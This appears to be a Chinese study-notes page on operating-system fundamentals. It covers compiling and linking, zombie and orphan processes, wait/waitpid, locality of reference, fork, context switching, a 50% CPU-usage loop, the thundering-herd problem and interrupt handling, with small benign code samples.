<h1 id="23-程序在系统中运行过程"><a href="#23-程序在系统中运行过程" class="headerlink" title="23. 程序在系统中运行过程"></a>23. 程序在系统中运行过程</h1><p>用户程序要在系统中运行，必须先将它装入内存，然后在将其转变为一个可以执行的程序，通常都要经过以下几个步骤：</p>
<ol>
<li>编译：由编译程序对用户源程序进行编译，形成若干个目标模块；</li>
<li>链接：由链接程序将编译后形成的一组目标模块以及它们所需要的库函数链接在一起，形成一个完整的装入模块</li>
<li>装入：由装入程序将装入模块装入内存</li>
</ol>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>以下是一个 hello.c 程序：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>在 Unix 系统上，由编译器把源文件转换为目标文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gcc -o hello hello.c</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>这个过程大致如下：</p>
<p><a href="https://qiniu.xiaoming.net.cn/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.jpg"><img src="https://qiniu.xiaoming.net.cn/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.jpg" alt="编译过程"></a></p>
<p><a href="https://qiniu.xiaoming.net.cn/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.jpg">编译过程</a></p>
<ul>
<li>预处理阶段：处理以 # 开头的预处理命令；</li>
<li>编译阶段：翻译成汇编文件；</li>
<li>汇编阶段：将汇编文件翻译成可重定位目标文件；</li>
<li>链接阶段：将可重定位目标文件和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标文件。</li>
</ul>
<h3 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h3><ul>
<li><strong>可执行目标文件</strong>：可以直接在内存中执行</li>
<li><strong>可重定位目标文件</strong>：可与其他可重定位目标文件在链接阶段合并，创建一个可执行目标文件</li>
<li><strong>共享目标文件</strong>：这是一种特殊的可重定位目标文件，可以在运行时被动态加载进内存并链接</li>
</ul>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>源程序经过编译后，可得到一组目标模块，再利用链接程序将这组目标模块链接，形成装入模块。根据链接时间的不同，可把链接分成如下三种：</p>
<ul>
<li>静态链接</li>
<li>装入时动态链接</li>
<li>运行时动态链接</li>
</ul>
<h3 id="静态链接方式"><a href="#静态链接方式" class="headerlink" title="静态链接方式"></a>静态链接方式</h3><p>在程序运行之前，先将各目标模块及它们所需的库函数，链接成一个完整的装配模块，以后不再拆开。我们把这种事先进行链接的方式称为静态链接方式。在将几个目标模块装配成一个装入模块时，须解决以下两个问题：</p>
<p><a href="http://wx-qiniu.xiaoming.net.cn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F.png"><img src="http://wx-qiniu.xiaoming.net.cn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F.png" alt="静态链接方式"></a></p>
<ol>
<li>对相对地址进行修改。如图4-4，在由编译程序所产生的所有目标模块中，使用的都是相对地址，其起始地址都为 0，每个模块中的地址都是相对于起始地址计算的。在链接成一个装入模块后，原模块 B 和 C 在装入模块的起始地址不再是 0，而分别是 L 和 L+M，所以此时须修改模块 B 和 C 中的相对地址，即把原 B 中的所有相对地址都加上 L，把原 C 中的所有相对地址都加上 L+M。</li>
<li>变换外部调用符号。将每个模块中所用的外部调用符号也都变换为相对地址，如把B的起始地址变换为 L，把 C 的起始地址变换为 L+M。这种先进行链接所形成的一个完整的装入模块，又称为可执行文件。通常都不再拆开它，要运行时可直接将它装入内存。这种事先进行链接，以后不再拆开的链接方式，称为静态链接方式。</li>
</ol>
<p>静态链接器以一组可重定位目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务：</p>
<ul>
<li>符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来。</li>
<li>重定位：链接器通过把每个符号定义与一个内存位置关联起来，然后修改所有对这些符号的引用，使得它们指向这个内存位置。</li>
</ul>
<h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>静态库有以下两个问题：</p>
<ul>
<li>当静态库更新时那么整个程序都要重新进行链接；</li>
<li>对于 printf 这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。</li>
</ul>
<p>共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点：</p>
<ul>
<li>在给定的文件系统中一个库只有一个文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中；</li>
<li>在内存中，一个共享库的 .text 节（已编译程序的机器代码）的一个副本可以被不同的正在运行的进程共享。</li>
</ul>
<h4 id="装入时动态装入"><a href="#装入时动态装入" class="headerlink" title="装入时动态装入"></a>装入时动态装入</h4><p>用户源程序经编译后所得的目标模块，是在装入内存时边装入边链接的，即在装入一 个目标模块时，若发生一个外部模块调用事件，将引起装入程序去找出相应的外部目标模块，并将它装入内存，还要按照图 4-4 所示的方式来修改目标模块中的相对地址。</p>
<h4 id="运行时动态装入"><a href="#运行时动态装入" class="headerlink" title="运行时动态装入"></a>运行时动态装入</h4><p>这种链接方式是将对某些模块的链接推迟到程序执行时才进行链接，即在执行过程中， 当发现一个被调用模块尚未装入内存时，立即由 OS 去找到该模块并将之装入内存，把它链接到调用者模块上。凡在执行过程中未被用到的目标模块，都不会被调入内存和被链接到装入模块上，这样不仅可加快程序的装入过程，而且可节省大量的内存空间。</p>
<h1 id="24-孤儿进程和僵尸进程"><a href="#24-孤儿进程和僵尸进程" class="headerlink" title="24. 孤儿进程和僵尸进程"></a>24. 孤儿进程和僵尸进程</h1><ul>
<li>孤儿进程：一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。孤儿进程将被<code>init</code>进程（进程号为 1）所收养，并由<code>init</code>进程对它们完成状态收集工作。由于孤儿进程会被<code>init</code>进程收养，所以孤儿进程不会对系统造成危害。</li>
<li>僵尸进程：一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过<code>wait()</code>或<code>waitpid()</code>获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用<code>wait()</code>或<code>waitpid()</code>，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵尸进程。僵尸进程通过 ps 命令显示出来的状态为<code>Z</code>（zombie）。系统所能使用的进程号是有限的，如果产生大量僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程。要消灭系统中大量的僵尸进程，只需要将其父进程杀死，此时僵尸进程就会变成孤儿进程，从而被<code>init</code>进程所收养，这样<code>init</code>进程就会释放所有的僵尸进程所占有的资源，从而结束僵尸进程。</li>
</ul>
<p>父子进程传递：</p>
<p>当一个子进程改变了它的状态时（停止运行，继续运行或者退出），有两件事会发生在父进程中：</p>
<ul>
<li>得到<code>SIGCHLD</code>信号</li>
<li><code>waitpid()</code>或者<code>wait()</code>调用会返回</li>
</ul>
<p>其中子进程发送的 SIGCHLD 信号包含了子进程的信息，比如进程 ID、进程状态、进程使用 CPU 的时间等。</p>
<p>在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息，父进程通过<code>wait()</code>和<code>waitpid()</code>来获得一个已经退出的子进程的信息。</p>
<h2 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h2><p>父进程调用<code>wait()</code>会一直阻塞，直到收到一个子进程退出的<code>SIGCHLD</code>信号，之后<code>wait()</code>函数会销毁子进程并返回。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pid_t wait(int *status)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 -1，同时<code>errno</code>被置为<code>ECHILD</code>。</p>
<p>参数<code>status</code>用来保存被收集的子进程退出时的一些状态，如果对这个子进程是如何死掉的毫不在意，只想把这个子进程消灭掉，可以设置这个参数为<code>NULL</code>。</p>
<h2 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid"></a>waitpid</h2><p>作用和 wait() 完全相同，但是多了两个可由用户控制的参数<code>pid</code>和<code>options</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pid_t waitpid(pid_t pid, int *status, int options)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p><code>pid</code>参数指示一个子进程的 ID，表示只关心这个子进程退出的<code>SIGCHLD</code>信号。如果<code>pid=-1</code>时，那么和<code>wait()</code>作用相同，都是关心所有子进程退出的<code>SIGCHLD</code>信号。</p>
<p><code>options</code>参数主要有<code>WNOHANG</code>和<code>WUNTRACED</code>两个选项，<code>WNOHANG</code>可以使<code>waitpid()</code>调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。</p>
<h1 id="25-程序局部性原理"><a href="#25-程序局部性原理" class="headerlink" title="25. 程序局部性原理"></a>25. 程序局部性原理</h1><p><strong>程序局部性原理</strong>：是指程序在执行时呈现出局部性规律，即在一段时间内，整个程序的执行仅限于程序中的某一部分。相应地，执行所访问的存储空间也局限于某个内存区域，具体来说，局部性通常有两种形式：时间局部性和空间局部性。</p>
<ul>
<li>时间局部性：被引用过一次的存储器位置在未来会被多次引用（通常在循环中）。</li>
<li>空间局部性：如果一个存储器的位置被引用，那么将来他附近的位置也会被引用。</li>
</ul>
<p>对于以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求数组元素之和，v为数组名，n为数组大小，</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> *v, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        sum+=v[i];</span><br><span class="line">    &#125;	</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>由于数组的特点是在内存中是连续存放的，根据代码以及局部性定义可知：</p>
<p>对于循环中的 <code>sum</code> 变量：有良好的<strong>时间局部性</strong>。因为在 for 循环结束之前，每次执行循环体都有对 <code>sum</code> 的访问。而 <code>sum</code> 没有空间局部性。因为 <code>sum</code> 是标量（也就是说通过 <code>sum</code> 这个地址只能得到一个值）</p>
<p>对于循环体中的 <code>v</code> 变量：有良好的<strong>空间局部性</strong>。因为数组 <code>v</code> 是按顺序存放在内存中，每次访问 <code>v[i]</code> 总是在 <code>v[i-1]</code> 的下一个位置。而 <code>v</code> 没有时间局部性，因为在循环体中，每个元素 <code>v[i]</code> 只会被访问一次。</p>
<p>对于二维数组，如果有以下两种访问方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">500</span>][<span class="number">500</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//先访问行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> i,j;    </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">500</span>; i++)    </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">500</span>; j++)</span><br><span class="line">	&#123;</span><br><span class="line">	    a[i][j]=i;</span><br><span class="line">	&#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先访问列</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> i,j;  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">500</span>; j++)    </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">500</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">	    a[i][j]=i;</span><br><span class="line">	&#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>fun_1 和 fun_2 都是对一个二维数组进行遍历赋值。在 fun_1 函数的 for 循环体中，是以行序为主序对元素进行遍历。也就是说内层循环先访问第一行的元素，然后第二行……，而<strong>二维数组在存储器中也是按照行序为主序来进行存储的</strong>。也就是说先存储第一行，然后第二行……，<strong>本例中存储顺序和访问顺序一致，所以可以该程序对 <code>a[][]</code> 的引用有良好的空间局部性</strong>。</p>
<p>而 fun_2 函数只是在 fun_1 的基础上将求和函数中的双重循环的索引 i 和 j 调换一下位置，也就是说在对 <code>a[][]</code> 进行遍历的时候，以列序为主序。即先访问第一列，在访问第二列……，而前面讲了二维数组在存储器中也是按照行序为主序来进行存储；意味着每访问一个元素，就要跳过 N 个元素才能访问下一个。<strong>这种情况下没有良好的空间局部性</strong>。</p>
<p>对于同一个数组，具有空间局部性的 fun_1 函数运行的效率几乎是没有局部性的 fun_2 函数的提高了一倍，至于为什么有良好局部性的程序有更好的性能，这个和计算机的缓存是息息相关。</p>
<h2 id="良好局部性程序有更好性能的原因"><a href="#良好局部性程序有更好性能的原因" class="headerlink" title="良好局部性程序有更好性能的原因"></a>良好局部性程序有更好性能的原因</h2><p>首先看一看计算机的存储结构：</p>
<p><a href="http://qiniu.xiaoming.net.cn/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E7%BA%A7%E7%BB%93%E6%9E%84.png"><img src="http://qiniu.xiaoming.net.cn/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E7%BA%A7%E7%BB%93%E6%9E%84.png" alt="计算机存储级结构"></a></p>
<p><a href="http://qiniu.xiaoming.net.cn/%E5%90%84%E7%B1%BB%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%92%8C%E8%AE%BF%E9%97%AE%E8%80%97%E6%97%B6.png"><img src="http://qiniu.xiaoming.net.cn/%E5%90%84%E7%B1%BB%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%92%8C%E8%AE%BF%E9%97%AE%E8%80%97%E6%97%B6.png" alt="各类存储器的大小和访问耗时"></a></p>
<p>寄存器，既是CPU的工作台，也是存放计算数据的地方。</p>
<p>CPU要工作，它需要数据或者地址，先从一级缓存里面找，找不到就从二级缓存里面找，依次类推。假如 CPU 到磁盘才有，那么这个数据就会存入内存，再存入三级缓存、二级缓存、一级缓存，最后存入寄存器，CPU 用它来计算了。所以说，可以这么看， L1是寄存器的缓存，L1是L2的缓存，依次这样下去，上面一层是下面一层的缓存。</p>
<p>从最快的 L1 Cache 到最慢的 HDD，其两者的访存时间差距达到了 6 个数量级，即便是和内存比较，也有几百倍的差距。举个例子，如果 CPU 在运算是直接从内存中读取指令和数据，执行一条指令 0.3ns，然后从内存读下一条指令，等 120ns，这样 CPU 99% 计算时间都会被浪费掉。</p>
<p>CPU 的工作要高速，希望 CPU 需要的数据更多的就在 L1 里面，一找就找着。不希望更多的跑到下面内存乃至磁盘里面去找，这样会花更多的时间。所以当 CPU 用了一个数据，计算机会遇见性的存入其他等会儿 CPU 可能会用到的数据到 L123 内存，用到的可能性越大，就能存到越接近寄存器的层次。这也才是缓存的真正意义。</p>
<p>那么，计算机怎样才能判断一个数据接下来可能被用到？</p>
<ul>
<li>时间局部性：如果一个信息项正在被访问，那么在近期它很可能还会被再次访问。</li>
<li>空间局部性：在最近的将来将用到的信息很可能与现在正在使用的信息在空间地址上是临近的。正在使用的这个数据地址旁边的数据，比如数组。</li>
</ul>
<h1 id="26-fork-操作原理"><a href="#26-fork-操作原理" class="headerlink" title="26. fork 操作原理"></a>26. fork 操作原理</h1><p>由 fork 创建的新进程被称为子进程（child process）。该函数被调用一次，但返回两次。<strong>两次返回的区别是子进程的返回值是 0，而父进程的返回值则是新进程（子进程）的进程 id</strong>。将子进程 id 返回给父进程的理由是：因为一个进程的子进程可以多于一个，没有一个函数使一个进程可以获得其所有子进程的进程 id 。对子进程来说，之所以 fork 返回 0 给它，是因为它随时可以调用 <code>getpid()</code> 来获取自己的 pid；也可以调用 <code>getppid()</code> 来获取父进程的id。(进程 id 0总是由交换进程使用，所以一个子进程的进程 id 不可能为 0 )。</p>
<p>fork 之后，操作系统会复制一个与父进程完全相同的子进程，虽说是父子关系，但是在操作系统看来，他们更像兄弟关系，这 2 个进程共享代码空间，但是数据空间是互相独立的，子进程数据空间中的内容是父进程的完整拷贝，指令指针也完全相同，子进程拥有父进程当前运行到的位置（两进程的程序计数器 pc 值相同，也就是说，子进程是从 fork 返回处开始执行的），但有一点不同，如果 fork 成功，子进程中 fork 的返回值是 0，父进程中 fork 的返回值是子进程的进程号，如果 fork 不成功，父进程会返回错误。</p>
<p>可以这样想象，2 个进程一直同时运行，而且步调一致，在 fork 之后，他们分别作不同的工作，也就是分岔了。</p>
<h1 id="27-什么是上下文切换"><a href="#27-什么是上下文切换" class="headerlink" title="27. 什么是上下文切换"></a>27. 什么是上下文切换</h1><p>多线程编程中一般线程的个数都大于CPU核心的个数，而一个CPU核心在任一时只能被一个线程使用，为了让这些线程都能得到有效执行，CPU采取的策略是为每个线程分配时间片并轮转的形式。当一个线程的时间片用完的时候，就会重新处于就绪状态让其他线程使用，这个过程就是一次上下文切换</p>
<p>也就是说，当前任务在执行完CPU时间片切换到另一个任务之前，会先保存自己的状态，以便下次再切换回这个任务时，可以再加载这个任务的状态。任务从保存到再次加载的过程就是一次上下文切换。</p>
<p>上下文切换通常是计算密集型的。也就是说，它需要相当可观的处理器时间，在每秒几十上百次的切换中，每次切换都需要纳秒量级的时间。所以，上下文切换对系统来说意味着消耗大量的CPU时间，事实上，可能是操作系统中时间消耗最大的操作。</p>
<p>Linux 相比与其他操作系统（包括其他类 Unix 系统）有很多的优点，其中有一项就是，其上下文切换和模式切换的时间消耗非常少。</p>
<h1 id="28-如何让运行时-CPU-占用率为50"><a href="#28-如何让运行时-CPU-占用率为50" class="headerlink" title="28. 如何让运行时 CPU 占用率为50%"></a>28. 如何让运行时 CPU 占用率为50%</h1><p>在 Linux 下，CPU 利用率分为用户态，系统态和空闲态，分别表示 CPU 处于用户态执行的时间，系统内核执行的时间，和空闲系统进程执行的时间，三者之和就是 CPU 的总时间，当没有用户进程、系统进程等需要执行的时候，CPU 就执行系统缺省的空闲进程。从平常的思维方式理解的话，CPU 的利用率就是非空闲进程占用时间的比例，即 CPU 执行非空闲进程的时间 / CPU 总的执行时间。</p>
<p>那么问题就很简单了，只要保持让 cpu 运行 50，休息 50 就可以保证 cpu 的利用保持在 50% 了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Thread;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cpu50</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> time_start;</span><br><span class="line">    	<span class="keyword">int</span> fulltime = <span class="number">100</span>;<span class="comment">//总时间</span></span><br><span class="line">    	<span class="keyword">int</span> runtime = <span class="number">50</span>;<span class="comment">//运行时间</span></span><br><span class="line">    	<span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        	time_start = System.currentTimeMillis();<span class="comment">//获取当前时间</span></span><br><span class="line">        	<span class="keyword">while</span>((System.currentTimeMillis()-time_start)&lt;runtime)&#123;&#125;</span><br><span class="line">         	<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(fulltime-runtime); </span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h1 id="29-什么是惊群效应？如何避免？"><a href="#29-什么是惊群效应？如何避免？" class="headerlink" title="29. 什么是惊群效应？如何避免？"></a>29. 什么是惊群效应？如何避免？</h1><p>惊群效应（thundering herd）是指多进程（多线程）在同时阻塞等待同一个事件的时候（休眠状态），如果等待的这个事件发生，那么他就会唤醒等待的所有进程（或者线程），但是最终却只能有一个进程（线程）获得这个时间的“控制权”，对该事件进行处理，而其他进程（线程）获取“控制权”失败，只能重新进入休眠状态，这种现象和性能浪费就叫做惊群效应。</p>
<p>惊群效应消耗了什么？</p>
<p>Linux 内核对用户进程（线程）频繁地做无效的调度、上下文切换等使系统性能大打折扣。上下文切换（context switch）过高会导致 CPU 像个搬运工，频繁地在寄存器和运行队列之间奔波，更多的时间花在了进程（线程）切换，而不是在真正工作的进程（线程）上面。直接的消耗包括 CPU 寄存器要保存和加载（例如程序计数器）、系统调度器的代码需要执行。间接的消耗在于多核 cache 之间的共享数据。为了确保只有一个进程（线程）得到资源，需要对资源操作进行加锁保护，加大了系统的开销。目前一些常见的服务器软件有的是通过锁机制解决的，比如 Nginx（它的锁机制是默认开启的，可以关闭）；还有些认为惊群对系统性能影响不大，没有去处理，比如 Lighttpd。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="Linux-解决方案之-Accept"><a href="#Linux-解决方案之-Accept" class="headerlink" title="Linux 解决方案之 Accept"></a>Linux 解决方案之 Accept</h3><p>Linux 2.6 版本之前，监听同一个 socket 的进程会挂在同一个等待队列上，当请求到来时，会唤醒所有等待的进程。</p>
<p>Linux 2.6 版本之后，通过引入一个标记位 <code>WQ_FLAG_EXCLUSIVE</code>，保证一次只会唤醒一个进程，解决掉了 accept 惊群效应。</p>
<h3 id="Nginx-锁实现方案"><a href="#Nginx-锁实现方案" class="headerlink" title="Nginx 锁实现方案"></a>Nginx 锁实现方案</h3><p>nginx master 进程监听端口号（例如80），所有的 nginx worker 进程开始用 epoll_wait 来处理新事件（linux下），如果不加任何保护，一个新连接来临时，会有多个 worker 进程在 epoll_wait 后被唤醒，然后发现自己 accept 失败。现在，我们可以看看 nginx 是怎么处理这个惊群问题了。</p>
<p>其具体思路是：不让多个进程在同一时间监听接受连接的 socket，而是让每个进程轮流监听，这样当有连接过来的时候，就只有一个进程在监听那肯定就没有惊群的问题。</p>
<p>Nginx 提供了一个 <code>accept_mutex</code> 这个东西，这是一个加在 accept 上的一把共享锁。即每个 worker 进程在执行 accept 之前都需要先获取锁，获取不到就放弃执行 accept()。有了这把锁之后，同一时刻，就只会有一个进程去 accpet()，这样就不会有惊群问题了。accept_mutex 是一个可控选项，我们可以显示地关掉，默认是打开的</p>
<p>具体做法是：利用一把进程间锁，每个进程中都尝试获得这把锁，如果获取成功将监听 socket 加入 wait 集合中，并设置超时等待连接到来，没有获得锁的进程则将监听 socket 从 wait 集合去除。这里只是简单讨论 nginx 在处理惊群问题基本做法，实际其代码还处理了很多细节问题，例如简单的连接的负载均衡、定时事件处理等等。</p>
<h1 id="30-中断和中断处理流程"><a href="#30-中断和中断处理流程" class="headerlink" title="30. 中断和中断处理流程"></a>30. 中断和中断处理流程</h1><h2 id="中断概念"><a href="#中断概念" class="headerlink" title="中断概念"></a>中断概念</h2><p>中断是指由于接收到来自外围硬件（相对于中央处理器和内存）的异步信号或来自软件的同步信号，而进行相应的硬件／软件处理。发出这样的信号称为进行中断请求（interrupt request，IRQ）。硬件中断导致处理器通过一个上下文切换（context switch）来保存执行状态（以程序计数器和程序状态字等寄存器信息为主）；软件中断则通常作为CPU指令集中的一个指令，以可编程的方式直接指示这种上下文切换，并将处理导向一段中断处理代码。中断在计算机多任务处理，尤其是实时系统中尤为有用。这样的系统，包括运行于其上的操作系统，也被称为“中断驱动的”（interrupt-driven）。</p>
<p>中断是一种使CPU中止正在执行的程序而转去处理特殊事件的操作，这些引起中断的事件称为中断源，它们可能是来自外设的输入输出请求，也可能是计算机的一些异常事故或其它内部原因。</p>
<h2 id="中断的作用"><a href="#中断的作用" class="headerlink" title="中断的作用"></a>中断的作用</h2><ul>
<li>并行操作</li>
<li>硬件故障报警与处理</li>
<li>支持多道程序并发运行，提高计算机系统的运行效率</li>
<li>支持实时处理功能</li>
</ul>
<h2 id="中断的分类"><a href="#中断的分类" class="headerlink" title="中断的分类"></a>中断的分类</h2><h3 id="按中断源进行分类"><a href="#按中断源进行分类" class="headerlink" title="按中断源进行分类"></a>按中断源进行分类</h3><p>发出中断请求的设备称为中断源。按中断源的不同，中断可分为</p>
<ul>
<li>内中断：即程序运行错误引起的中断</li>
<li>外中断：即由外部设备、接口卡引起的中断</li>
<li>软件中断：由写在程序中的语句引起的中断程序的执行，称为软件中断</li>
</ul>
<h3 id="按CPU接不接受中断请求进行分类"><a href="#按CPU接不接受中断请求进行分类" class="headerlink" title="按CPU接不接受中断请求进行分类"></a>按CPU接不接受中断请求进行分类</h3><p>CPU 通过指令限制某些设备发出中断请求，称为屏蔽中断。从 CPU 要不要接收中断即能不能限制某些中断发生的角度 ，中断可分为</p>
<ul>
<li>可屏蔽中断 ：可被 CPU 通过指令限制某些设备发出中断请求的中断</li>
<li>不可屏蔽中断：不允许屏蔽的中断，如电源掉电</li>
</ul>
<p>中断允许触发器：在 CPU 内部设置一个中断允许触发器，只有该触发器置“1”，才允许中断；置“0”，不允许中断。</p>
<p>指令系统中，开中断指令，使中断触发器置“1”，关中断指令，使中断触发器置“0”</p>
<h2 id="中断优先级和中断嵌套"><a href="#中断优先级和中断嵌套" class="headerlink" title="中断优先级和中断嵌套"></a>中断优先级和中断嵌套</h2><ul>
<li>中断优先级：为了管理众多的中断请求，需要按每个（类）中断处理的急迫程度，对中断进行分级管理，称其为中断优先级。在有多个中断请求时，总是响应与处理优先级高的设备的中断请求。</li>
<li>中断嵌套：当 CPU 正在处理优先级较低的一个中断，又来了优先级更高的一个中断请求，则 CPU 先停止低优先级的中断处理过程，去响应优先级更高的中断请求，在优先级更高的中断处理完成之后，再继续处理低优先级的中断，这种情况称为中断嵌套。</li>
</ul>
<p>中断和异常理解为<strong>两种中断当前程序执行的不同机制</strong>。这是中断和异常的共同点。不同点在于：</p>
<ul>
<li>中断(interrupt)是异步的事件，典型的比如由I/O设备触发；异常(exception)是同步的事件，典型的比如处理器执行某条指令时发现出错了等等。</li>
<li>中断又可以分为可屏蔽中断和非可屏蔽中断，异常又分为故障、陷阱和异常中止3种</li>
<li>平常所说的屏蔽中断是不包括异常的，即异常不会因为CPU的IF位被清（关中断，指令：cli）而受影响，比如缺页异常，即使关了中断也会触发CPU的处理。</li>
</ul>
<h2 id="中断（异常）处理流程"><a href="#中断（异常）处理流程" class="headerlink" title="中断（异常）处理流程"></a>中断（异常）处理流程</h2><p><a href="http://qiniu.xiaoming.net.cn/%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B.png"><img src="http://qiniu.xiaoming.net.cn/%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B.png" alt="中断处理流程"></a></p>
<p>需要明确的一点是 CPU 对于中断和异常的具体处理机制本质上是完全一致的，即：当 CPU 收到中断或者异常的信号时，它会暂停执行当前的程序或任务，通过一定的机制跳转到负责处理这个信号的相关处理程序中，在完成对这个信号的处理后再跳回到刚才被打断的程序或任务中。</p>
<p>具体的处理过程如下：</p>
<h3 id="中断响应的事前准备："><a href="#中断响应的事前准备：" class="headerlink" title="中断响应的事前准备："></a>中断响应的事前准备：</h3><p>系统要想能够应对各种不同的中断信号，总的来看就是<strong>需要知道每种信号应该由哪个中断服务程序负责以及这些中断服务程序具体是如何工作的</strong>。系统只有事前对这两件事都知道得很清楚，才能正确地响应各种中断信号和异常。</p>
<p>系统将所有的中断信号统一进行了编号（一共256个：0～255），这个号称为中断向量，具体哪个中断向量表示哪种中断有的是规定好的，也有的是在给定范围内自行设定的。</p>
<p>中断向量和中断服务程序的对应关系主要是由IDT（中断向量表）负责。操作系统在 IDT 中设置好各种中断向量对应的中断描述符（一共有三类中断门描述符：任务门、中断门和陷阱门），留待 CPU 查询使用。而 IDT 本身的位置是由 idtr 保存的，当然这个地址也是由 OS 填充的。</p>
<p>中断服务程序具体负责处理中断（异常）的代码是由软件，也就是操作系统实现的，这部分代码属于操作系统内核代码。也就是说从 CPU 检测中断信号到加载中断服务程序以及从中断服务程序中恢复执行被暂停的程序，这个流程基本上是硬件确定下来的，而具体的中断向量和服务程序的对应关系设置和中断服务程序的内容是由操作系统确定的。</p>
